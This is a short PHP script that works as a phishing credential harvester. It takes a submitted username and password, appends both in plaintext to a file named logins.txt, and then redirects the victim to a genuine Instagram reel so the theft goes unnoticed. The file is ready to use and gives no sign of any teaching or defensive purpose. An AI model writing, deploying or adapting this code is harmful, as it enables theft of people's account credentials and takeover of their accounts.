<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = "Username: $username | Password: $password\n";
    file_put_contents("logins.txt", $data, FILE_APPEND);

    header("Location: https://www.instagram.com/reel/DD2OlhrtFMI/?igsh=dm02aDZtcmQxd2Jv");
    exit();
}
?>

